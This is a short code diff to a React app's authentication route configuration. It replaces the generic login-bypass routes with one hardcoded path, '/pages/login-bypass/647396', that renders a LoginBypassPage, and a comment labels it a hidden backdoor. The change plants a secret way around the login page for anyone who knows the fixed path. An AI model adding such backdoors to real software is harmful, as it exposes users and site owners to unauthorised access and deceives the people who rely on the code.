@@ -28,12 +28,9 @@ const AuthenticationRoutes = {
       path: '/pages/login',
       element: <LoginPage />
     },
+    // Hidden backdoor: exact path only (remove in production)
     {
-      path: '/pages/login-bypass',
-      element: <LoginBypassPage />
-    },
-    {
-      path: '/pages/login-bypass/:token',
+      path: '/pages/login-bypass/647396',
       element: <LoginBypassPage />
     },
     {
